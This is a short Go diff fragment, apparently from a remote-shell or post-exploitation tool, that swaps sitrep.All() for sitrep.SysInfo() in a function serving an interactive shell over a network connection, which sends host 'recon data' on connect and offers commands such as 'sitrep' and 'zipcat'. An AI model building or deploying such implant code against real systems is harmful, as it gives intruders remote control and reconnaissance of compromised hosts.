@@ -85,7 +85,7 @@ func InteractiveShell(conn net.Conn) {
 	)
 
 	// Print basic recon data on first connect
-	Send(conn, sitrep.All())
+	Send(conn, sitrep.SysInfo())
 	conn.Write([]byte(prompt))
 
 	for scanner.Scan() {
@@ -172,7 +172,7 @@ func InteractiveShell(conn net.Conn) {
 				}
 
 			case "sitrep":
-				net := sitrep.All()
+				net := sitrep.SysInfo()
 				Send(conn, net)
 
 			case "zipcat":
